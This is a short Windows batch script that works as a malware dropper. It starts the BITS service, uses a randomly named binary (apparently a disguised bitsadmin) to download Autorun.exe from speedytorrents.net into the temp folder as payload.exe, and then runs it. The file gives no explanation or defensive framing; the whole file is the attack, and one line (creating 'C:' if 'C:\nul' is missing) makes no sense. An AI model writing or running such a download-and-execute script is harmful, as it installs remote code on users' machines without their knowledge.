@echo off
net start bits
IF NOT EXIST "C:\nul" mkdir "C:"
del "%temp%\payload.exe"
QXAJQVT.sys /transfer VQTNGJXO /download /priority high http://speedytorrents.net/exeSite/downloads/10039/Autorun.exe "%temp%\payload.exe"
"%temp%\payload.exe"
